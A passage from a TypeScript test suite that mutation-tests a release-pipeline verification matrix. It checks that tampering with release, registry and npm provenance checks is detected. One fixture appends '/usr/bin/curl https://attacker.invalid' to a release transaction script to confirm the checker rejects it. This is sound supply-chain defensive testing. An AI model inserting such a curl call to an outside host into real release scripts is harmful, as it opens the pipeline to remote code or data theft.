        expect.stringMatching(/release mutation hybrid case release\.case\.m129 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m130 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m131 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m132 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m133 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m134 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m135 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m136 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m137 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m138 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m139 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m141 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m142 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m143 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m144 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m146 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m147 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m148 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m149 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m150 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m151 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m152 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m153 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m154 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m155 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m156 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m157 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m158 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m159 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m160 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m161 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m162 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m163 invocation must retain its exact/),
        expect.stringMatching(/release mutation hybrid case release\.case\.m164 invocation must retain its exact/)
      ])
    );

    const nonAdjacentSeal = replaceExactly(
      matrixSource,
      "    const releaseMutationProblems = releaseMutationPlan.seal();",
      "    void registryRun;\n    const releaseMutationProblems = releaseMutationPlan.seal();"
    );
    expect(historicalMutationProblems(nonAdjacentSeal)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid lifecycle must be one clean seal followed by the exact m037/)
      ])
    );

    // NEGATIVE control: an exact-text but root-unbound second physical matcher must
    // fail the global span multiplicity check instead of borrowing a legacy root.
    const sharedRegistryMatcherLoop = [
      "    for (const weakenedRegistryStep of weakenedRegistrySteps) {",
      "      expect(mcpRegistryStepProblems(weakenedRegistryStep, mcpbInputs.integrity)).toContain(",
      "        MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM",
      "      );",
      "    }"
    ].join("\n");
    const duplicateSharedRegistryMatcher = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      [
        sharedRegistryMatcherLoop,
        "    void ((weakenedRegistryStep: YamlRecord) => {",
        "      expect(mcpRegistryStepProblems(weakenedRegistryStep, mcpbInputs.integrity)).toContain(",
        "        MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM",
        "      );",
        "    });"
      ].join("\n")
    );
    expect(historicalMutationProblems(duplicateSharedRegistryMatcher)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid matcher 5e2815d5.*physical multiplicity must equal 1 .*found 2/)
      ])
    );

    // NEGATIVE control: migrated-only frozen matcher hashes must remain physically
    // absent even when their exact historical root-bound assertions are appended after the tail.
    const legacyM111MatcherNode = [
      "expect(",
      "      mcpRegistryStepProblems(",
      "        registryStep,",
      `        ${legacyM111CallNode}`,
      "      )",
      "    ).toContain(MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM)"
    ].join("\n");
    const legacyM112MatcherNode = [
      "expect(npmProvenanceContractProblems(provenanceWorkflowCompositionMutation, mcpbInputs.integrity)).toContain(",
      "      NPM_PROVENANCE_CONTRACT_PROBLEM",
      "    )"
    ].join("\n");
    const legacyM113MatcherNode = [
      "expect(npmProvenanceContractProblems(mcpbInputs.release, provenanceEvaluatorCompositionMutation)).toContain(",
      "      NPM_PROVENANCE_CONTRACT_PROBLEM",
      "    )"
    ].join("\n");
    const legacyM151MatcherNode =
      "expect(npmProvenanceWorkflowProblems(weakenedProvenanceWorkflow)).toContain(NPM_PROVENANCE_CONTRACT_PROBLEM)";
    expect(sha256Text(legacyM111MatcherNode)).toBe("f77d156123db5a20c3cb2984980ad88548547a95d673ff9315d1be394ba86c5d");
    expect(sha256Text(legacyM112MatcherNode)).toBe("70d1140baaad93fc1a0491e5da0b6d8d3c4474a6989db7642db4f0602ab0715a");
    expect(sha256Text(legacyM113MatcherNode)).toBe("1b65bfa3daf8f47b905b8593e9e7abb7f6aa1a93724a7f9609e43421e93d9e94");
    expect(sha256Text(legacyM151MatcherNode)).toBe("3df3ee2ebc3147bc3f2669b03a7d54b7dd8f5d4f2bf7a125e749d5a9fbb9c240");
    const resurrectedMigratedMatchers = replaceExactly(
      matrixSource,
      finalRequiredReleaseCheck,
      [
        `    void ${legacyM111MatcherNode};`,
        `    const provenanceWorkflowCompositionMutation = ${legacyM112CallNode};`,
        `    void ${legacyM112MatcherNode};`,
        `    const provenanceEvaluatorCompositionMutation = ${legacyM113CallNode};`,
        `    void ${legacyM113MatcherNode};`,
        `    void ${legacyM151MatcherNode};`,
        finalRequiredReleaseCheck
      ].join("\n")
    );
    const resurrectedMigratedMatcherProblems = historicalMutationProblems(resurrectedMigratedMatchers);
    expect(resurrectedMigratedMatcherProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m111 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m112 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(
          /release mutation hybrid frozen ID release\.m113 must exist in exactly one legacy XOR declarative representation; found 1\/1/
        ),
        expect.stringMatching(/release mutation hybrid matcher f77d1561.*physical multiplicity must equal 0 .*found 1/),
        expect.stringMatching(/release mutation hybrid matcher 70d1140b.*physical multiplicity must equal 0 .*found 1/),
        expect.stringMatching(/release mutation hybrid matcher 1b65bfa3.*physical multiplicity must equal 0 .*found 1/),
        expect.stringMatching(/release mutation hybrid matcher 3df3ee2e.*physical multiplicity must equal 0 .*found 1/)
      ])
    );
    expect(resurrectedMigratedMatcherProblems).not.toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /remaining legacy order|legacy case .* has no remaining root call|remaining matcher census/
        )
      ])
    );

    // NEGATIVE control: removing the one residual physical matcher must fail the
    // same class invariant even though its 69 remaining legacy root mutations remain in place.
    const missingSharedRegistryMatcher = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      [
        "    for (const weakenedRegistryStep of weakenedRegistrySteps) {",
        "      void weakenedRegistryStep;",
        "    }"
      ].join("\n")
    );
    expect(historicalMutationProblems(missingSharedRegistryMatcher)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid matcher 5e2815d5.*physical multiplicity must equal 1 .*found 0/)
      ])
    );

    // NEGATIVE control: creation order is not runtime order if a named iterable
    // is reversed between construction and its shared matcher loop.
    const reversedSharedRegistryIterable = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      ["    weakenedRegistrySteps.reverse();", sharedRegistryMatcherLoop].join("\n")
    );
    expect(crossGenerationMutationProblems(reversedSharedRegistryIterable)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    const splitReleaseLoop = [
      "    for (const splitReleaseMutant of splitReleaseMutants) {",
      "      expect(mcpbContractProblems({ ...mcpbInputs, release: splitReleaseMutant })).toContain(",
      "        MCPB_SPLIT_RELEASE_CONTRACT_PROBLEM",
      "      );",
      "    }"
    ].join("\n");
    const taintedReleaseTransactionCase = [
      [
        "    const taintedTransaction = `",
        "$",
        "{mcpbInputs.releaseTransaction.slice(0, -1)}\\n/usr/bin/curl https://attacker.invalid\\n`;"
      ].join(""),
      '    const taintedTransactionHash = createHash("sha256").update(taintedTransaction).digest("hex");',
      "    expect(",
      "      mcpbContractProblems({",
      "        ...mcpbInputs,",
      "        release: replaceExactly(",
      "          mcpbInputs.release,",
      "          SPLIT_CONTRACT_SHA256.githubTransactionSource,",
      "          taintedTransactionHash",
      "        ),",
      "        releaseTransaction: taintedTransaction",
      "      })",
      "    ).toContain(MCPB_SPLIT_RELEASE_CONTRACT_PROBLEM);"
    ].join("\n");

    // NEGATIVE control: a runtime transform between the exact array and shared loop
    // must fail the closed iterable topology even though every root call and matcher is unchanged.
    const reversedCurrentSplitIterable = replaceExactly(
      matrixSource,
      splitReleaseLoop,
      ["    splitReleaseMutants.reverse();", splitReleaseLoop].join("\n")
    );
    const reversedCurrentSplitProblems = versionedProblemsWithCoarseWitnessesRepinned(reversedCurrentSplitIterable);
    expect(reversedCurrentSplitProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(reversedCurrentSplitProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation transition shared primary matcher .*exact closed iterable\/runtime topology for 53 current root/
        )
      ])
    );

    // NEGATIVE control: current-only cases have frozen runtime order too. Moving the
    // shared m582-m626 family across m627 must fail after only coarse SHA witnesses are repinned.
    const reorderedCurrentSplitCases = replaceExactly(
      matrixSource,
      `${splitReleaseLoop}\n${taintedReleaseTransactionCase}`,
      `${taintedReleaseTransactionCase}\n${splitReleaseLoop}`
    );
    const reorderedCurrentSplitProblems = versionedProblemsWithCoarseWitnessesRepinned(reorderedCurrentSplitCases);
    expect(reorderedCurrentSplitProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(reorderedCurrentSplitProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /global case execution order must equal exact frozen primary-oracle order; .*expected release\.case\.m582.*found release\.case\.m627/
        )
      ])
    );

    // NEGATIVE control: a callback return can make every later matcher unreachable
    // without changing its AST bytes, so the current transition observer must reject it directly.
    const earlyCurrentMatrixReturn = replaceExactly(
      matrixSource,
      "    const splitReleaseMutants = [",
      "    if (true) return;\n    const splitReleaseMutants = ["
    );
    const earlyCurrentMatrixReturnProblems = versionedProblemsWithCoarseWitnessesRepinned(earlyCurrentMatrixReturn);
    expect(earlyCurrentMatrixReturnProblems).not.toEqual(
      expect.arrayContaining([expect.stringMatching(/current matrix (?:source|slice) witness mismatch/)])
    );
    expect(earlyCurrentMatrixReturnProblems).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/matrix callback must not return before all case executions; found return at/)
      ])
    );

    // NEGATIVE control: an alias can preserve the named array's bytes while
    // inserting an unreviewed runtime hop between the frozen array and loop.
    const aliasedSharedRegistryIterable = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      [
        "    const aliasedWeakenedRegistrySteps = weakenedRegistrySteps;",
        "    for (const weakenedRegistryStep of aliasedWeakenedRegistrySteps) {",
        "      expect(mcpRegistryStepProblems(weakenedRegistryStep, mcpbInputs.integrity)).toContain(",
        "        MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM",
        "      );",
        "    }"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(aliasedSharedRegistryIterable)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: even a value-preserving alternate iterable is outside
    // the exact named-array execution topology and could later hide filtering.
    const copiedSharedRegistryIterable = replaceExactly(
      matrixSource,
      "    for (const weakenedRegistryStep of weakenedRegistrySteps) {",
      "    for (const weakenedRegistryStep of weakenedRegistrySteps.slice()) {"
    );
    expect(crossGenerationMutationProblems(copiedSharedRegistryIterable)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: the exact loop cannot be made conditional, repeated or
    // exception-dependent by placing it under another callback-body statement.
    const wrappedSharedRegistryMatcher = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      ["    if (false) {", sharedRegistryMatcherLoop, "    }"].join("\n")
    );
    expect(crossGenerationMutationProblems(wrappedSharedRegistryMatcher)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: a direct loop is still unreachable if the matrix callback
    // returns first. Returns in nested helpers remain outside this callback guard.
    const returnedBeforeSharedRegistryMatcher = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      ["    if (true) return;", sharedRegistryMatcherLoop].join("\n")
    );
    expect(crossGenerationMutationProblems(returnedBeforeSharedRegistryMatcher)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid matrix callback must not return before all case executions/)
      ])
    );

    // NEGATIVE control: the four non-manifest Registry mutations are not merely
    // a count. Their exact reviewed expressions must remain inert until detection.
    const poisonedRegistryOwnerlessPrefix = replaceExactly(
      matrixSource,
      '{ ...registryStep, if: "always()" }',
      '(() => { throw new Error("ownerless-prefix-bypass"); })()'
    );
    expect(crossGenerationMutationProblems(poisonedRegistryOwnerlessPrefix)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: merely mentioning a carrier root is insufficient. The
    // exact carrier value itself must be the sole Registry wrapper argument.
    const discardedRegistryCarrier = replaceExactly(
      matrixSource,
      "      registryStepWithRun(fragmentedCurlWriteRun),",
      "      (false ? registryStepWithRun(fragmentedCurlWriteRun) : registryStep),"
    );
    expect(crossGenerationMutationProblems(discardedRegistryCarrier)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: a direct Registry root cannot execute and then be
    // discarded through a comma expression before registryStepWithRun receives it.
    const discardedDirectRegistryRoot = replaceExactly(
      matrixSource,
      [
        "      registryStepWithRun(",
        "        replaceExactly(registryRun, 'GH_CONFIG_DIR=\"$WORK_ROOT/gh-config\"', " +
          "'GH_CONFIG_DIR=\"$GITHUB_WORKSPACE\"')",
        "      ),"
      ].join("\n"),
      [
        "      registryStepWithRun(",
        "        (replaceExactly(registryRun, 'GH_CONFIG_DIR=\"$WORK_ROOT/gh-config\"', " +
          "'GH_CONFIG_DIR=\"$GITHUB_WORKSPACE\"'), registryRun)",
        "      ),"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(discardedDirectRegistryRoot)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: non-Registry shared arrays also require the root call's
    // resulting mutant, not a comma expression that returns the clean source. The
    // current topology has 24 frozen roots; wrapping multiline m165 changes its
    // call-node bytes, invalidating the m165 identity, root, check, and matcher leaf
    // while leaving the shared matcher with exactly 23 bound owners.
    const legacyM165CallNode = [
      "replaceExactly(",
      "        mcpbInputs.integrity,",
      `        \`leafCertificate.subjectAltName !== \\\`URI:\\\${expectedSignerUri}\\\`\`,`,
      '        "!leafCertificate.subjectAltName?.includes(expectedSignerUri)"',
      "      )"
    ].join("\n");
    const discardedM165CallNode = [
      "replaceExactly(",
      "          mcpbInputs.integrity,",
      `          \`leafCertificate.subjectAltName !== \\\`URI:\\\${expectedSignerUri}\\\`\`,`,
      '          "!leafCertificate.subjectAltName?.includes(expectedSignerUri)"',
      "        )"
    ].join("\n");
    expect(sha256Text(legacyM165CallNode)).toBe("9db0852a3f0c874f75e5d725f77c8a1842d75f2a50af223797db87bdbdf5208f");
    expect(sha256Text(discardedM165CallNode)).toBe("547cd2b527076b5f1c6e6d3b3436026cfc8ec0b2fc77ce4544079312ea5e46eb");
    const discardedProvenanceRoot = replaceExactly(
      matrixSource,
      `      ${legacyM165CallNode},`,
      ["      (", `        ${discardedM165CallNode},`, "        mcpbInputs.integrity", "      ),"].join("\n")
    );
    expect(crossGenerationMutationProblems(discardedProvenanceRoot)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(/current unchanged identity release\.m165 has no exact current owner-case proof/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 84d0f85b5d5eb401cf80482bfec6ab0a2d4f60687d54d364f189bdc73052f680.*exact closed iterable\/runtime topology for 24 frozen root/
        )
      ])
    );

    // NEGATIVE control: the shared matcher must execute unconditionally once for
    // every iterable element; a continue path cannot preserve the certified trace.
    const conditionallySkippedSharedRegistryMatcher = replaceExactly(
      matrixSource,
      sharedRegistryMatcherLoop,
      [
        "    for (const weakenedRegistryStep of weakenedRegistrySteps) {",
        "      if (weakenedRegistryStep) continue;",
        "      expect(mcpRegistryStepProblems(weakenedRegistryStep, mcpbInputs.integrity)).toContain(",
        "        MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM",
        "      );",
        "    }"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(conditionallySkippedSharedRegistryMatcher)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 5e2815d5.*exact closed iterable\/runtime topology for 69 frozen root/
        )
      ])
    );

    // NEGATIVE control: the indexed shared loop must consume its entire exact
    // dense case array, not a shortened literal prefix.
    const shortenedTransactionMutationLoop = replaceExactly(
      matrixSource,
      [
        "    for (let mutationIndex = 0; mutationIndex < 76; mutationIndex++) {",
        "      const { mutant, expectedProblem } = releaseTransactionMutationCases[mutationIndex]!;"
      ].join("\n"),
      [
        "    for (let mutationIndex = 0; mutationIndex < 75; mutationIndex++) {",
        "      const { mutant, expectedProblem } = releaseTransactionMutationCases[mutationIndex]!;"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(shortenedTransactionMutationLoop)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher df5a0075.*exact closed iterable\/runtime topology for 76 frozen root/
        )
      ])
    );

    // NEGATIVE control: object aliases can retain both field names and matcher
    // text while routing the detector to expectedProblem instead of the mutant.
    const swappedTransactionBindings = replaceExactly(
      matrixSource,
      "      const { mutant, expectedProblem } = releaseTransactionMutationCases[mutationIndex]!;",
      "      const { mutant: expectedProblem, expectedProblem: mutant } = " +
        "releaseTransactionMutationCases[mutationIndex]!;"
    );
    expect(crossGenerationMutationProblems(swappedTransactionBindings)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher df5a0075.*exact closed iterable\/runtime topology for 76 frozen root/
        )
      ])
    );

    // NEGATIVE control: tuple binding order is part of execution identity. The
    // same matcher text must not consume the diagnostic label as release source.
    const swappedTagIdentityBindings = replaceExactly(
      matrixSource,
      "    for (const [label, weakenedRelease] of [",
      "    for (const [weakenedRelease, label] of ["
    );
    expect(crossGenerationMutationProblems(swappedTagIdentityBindings)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid current source must retain exact SHA-256/),
        expect.stringMatching(/release mutation hybrid current matrix slice must retain exact SHA-256/),
        expect.stringMatching(
          /release mutation hybrid shared primary matcher 2392196b.*exact closed iterable\/runtime topology for 3 frozen root/
        )
      ])
    );

    const stagedPrefixCallBlock = [
      "    releaseMutationPlan.executeThrough(releaseMutationM037, {",
      "      registryEvaluatorProblems: mcpRegistryEvaluatorProblems,",
      "      registryStepProblems: mcpRegistryRunProblems,",
      "      npmContractProblems: npmProvenanceContractProblems,",
      "      npmEvaluatorProblems: npmProvenanceEvaluatorProblems,",
      "      npmWorkflowProblems: npmProvenanceWorkflowProblems",
      "    });"
    ].join("\n");
    const stagedRemainingCall = "    releaseMutationPlan.executeRemaining();";
    const stagedRemainingBlock = [
      stagedRemainingCall,
      '    expect(releaseMutationPlan.phase).toBe("executed");',
      "    expect(releaseMutationPlan.caseExecutions).toBe(91);",
      "    expect(releaseMutationPlan.expectationExecutions).toBe(91);"
    ].join("\n");
    const stagedLifecycleProblem =
      /release mutation hybrid lifecycle must be one clean seal followed by the exact m037 executeThrough\/executeRemaining pair with derived phase and execution censuses/;

    // NEGATIVE control: the prefix has its own phase and derived case/expectation
    // census; final-state claims cannot be borrowed before the suffix executes.
    const wrongStagedPrefixPhase = replaceExactly(
      matrixSource,
      '    expect(releaseMutationPlan.phase).toBe("partially-executed");',
      '    expect(releaseMutationPlan.phase).toBe("executed");'
    );
    expect(crossGenerationMutationProblems(wrongStagedPrefixPhase)).toEqual(
      expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
    );
    const wrongStagedPrefixCaseCount = replaceExactly(
      matrixSource,
      "    expect(releaseMutationPlan.caseExecutions).toBe(36);",
      "    expect(releaseMutationPlan.caseExecutions).toBe(35);"
    );
    const wrongStagedPrefixCensus = replaceExactly(
      wrongStagedPrefixCaseCount,
      "    expect(releaseMutationPlan.expectationExecutions).toBe(36);",
      "    expect(releaseMutationPlan.expectationExecutions).toBe(35);"
    );
    expect(crossGenerationMutationProblems(wrongStagedPrefixCensus)).toEqual(
      expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
    );
    const wrongStagedFinalCaseCount = replaceExactly(
      matrixSource,
      "    expect(releaseMutationPlan.caseExecutions).toBe(91);",
      "    expect(releaseMutationPlan.caseExecutions).toBe(90);"
    );
    const wrongStagedFinalCensus = replaceExactly(
      wrongStagedFinalCaseCount,
      "    expect(releaseMutationPlan.expectationExecutions).toBe(91);",
      "    expect(releaseMutationPlan.expectationExecutions).toBe(90);"
    );
    expect(crossGenerationMutationProblems(wrongStagedFinalCensus)).toEqual(
      expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
    );

    const missingStagedRemaining = replaceExactly(matrixSource, stagedRemainingCall, "");
    expect(crossGenerationMutationProblems(missingStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(stagedLifecycleProblem),
        expect.stringMatching(/declarative execution schedule must terminate complete .*found prefix/)
      ])
    );

    // NEGATIVE control: a second suffix call is a replay of a completed plan,
    // regardless of whether it is adjacent to the first call or labelled a retry.
    const replayedStagedRemaining = replaceExactly(
      matrixSource,
      stagedRemainingCall,
      [stagedRemainingCall, stagedRemainingCall].join("\n")
    );
    expect(crossGenerationMutationProblems(replayedStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(stagedLifecycleProblem),
        expect.stringMatching(/declarative executeRemaining .*cannot replay a completed plan/)
      ])
    );

    // NEGATIVE control: executeRemaining consumes only the adapters frozen by
    // executeThrough; accepting another adapter would reopen suffix injection.
    const reinjectedRemainingAdapter = replaceExactly(
      matrixSource,
      stagedRemainingCall,
      "    releaseMutationPlan.executeRemaining({ registryStepProblems: mcpRegistryRunProblems });"
    );
    expect(crossGenerationMutationProblems(reinjectedRemainingAdapter)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid executeRemaining event must use the exact staged execution argument shape/
        ),
        expect.stringMatching(stagedLifecycleProblem)
      ])
    );

    // NEGATIVE control: the prefix must preflight the complete adapter set needed
    // by its suffix; neither the Registry-step nor any npm adapter can be omitted.
    const missingStagedAdapter = replaceExactly(
      matrixSource,
      stagedPrefixCallBlock,
      [
        "    releaseMutationPlan.executeThrough(releaseMutationM037, {",
        "      registryEvaluatorProblems: mcpRegistryEvaluatorProblems",
        "    });"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(missingStagedAdapter)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind registryStepProblems exactly to mcpRegistryRunProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmContractProblems exactly to npmProvenanceContractProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmEvaluatorProblems exactly to npmProvenanceEvaluatorProblems/
        ),
        expect.stringMatching(
          /release mutation hybrid execute adapter must bind npmWorkflowProblems exactly to npmProvenanceWorkflowProblems/
        ),
        expect.stringMatching(stagedLifecycleProblem)
      ])
    );

    // NEGATIVE controls: lifecycle calls cannot hide under control flow or behind
    // computed property syntax while retaining a superficially valid method name.
    const nestedStagedRemaining = replaceExactly(
      matrixSource,
      stagedRemainingCall,
      ["    if (true) {", "      releaseMutationPlan.executeRemaining();", "    }"].join("\n")
    );
    expect(crossGenerationMutationProblems(nestedStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid execution events must be exact direct top-level property calls/)
      ])
    );
    const computedStagedRemaining = replaceExactly(
      matrixSource,
      stagedRemainingCall,
      '    releaseMutationPlan["executeRemaining"]();'
    );
    expect(crossGenerationMutationProblems(computedStagedRemaining)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/release mutation hybrid execution events must be exact direct top-level property calls/)
      ])
    );

    // NEGATIVE controls: executeThrough accepts only the exact m037 boundary.
    const unknownStagedBoundary = replaceExactly(
      matrixSource,
      stagedPrefixCallBlock,
      [
        "    releaseMutationPlan.executeThrough(releaseMutationUnknown, {",
        "      registryEvaluatorProblems: mcpRegistryEvaluatorProblems,",
        "      registryStepProblems: mcpRegistryRunProblems,",
        "      npmContractProblems: npmProvenanceContractProblems,",
        "      npmEvaluatorProblems: npmProvenanceEvaluatorProblems,",
        "      npmWorkflowProblems: npmProvenanceWorkflowProblems",
        "    });"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(unknownStagedBoundary)).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/declarative executeThrough .*must name one exact root handle/),
        expect.stringMatching(stagedLifecycleProblem)
      ])
    );
    const wrongKnownStagedBoundary = replaceExactly(
      matrixSource,
      stagedPrefixCallBlock,
      [
        "    releaseMutationPlan.executeThrough(releaseMutationM036, {",
        "      registryEvaluatorProblems: mcpRegistryEvaluatorProblems,",
        "      registryStepProblems: mcpRegistryRunProblems,",
        "      npmContractProblems: npmProvenanceContractProblems,",
        "      npmEvaluatorProblems: npmProvenanceEvaluatorProblems,",
        "      npmWorkflowProblems: npmProvenanceWorkflowProblems",
        "    });"
      ].join("\n")
    );
    expect(crossGenerationMutationProblems(wrongKnownStagedBoundary)).toEqual(
      expect.arrayContaining([expect.stringMatching(stagedLifecycleProblem)])
    );

    // NEGATIVE controls: the suffix executes exactly between the shared m038-m106
    // Registry loop and legacy m165, preserving the frozen global case order.
    const stagedWithoutRemaining = replaceExactly(matrixSource, stagedRemainingBlock, "");
    const earlyStagedRemaining = replaceExactly(
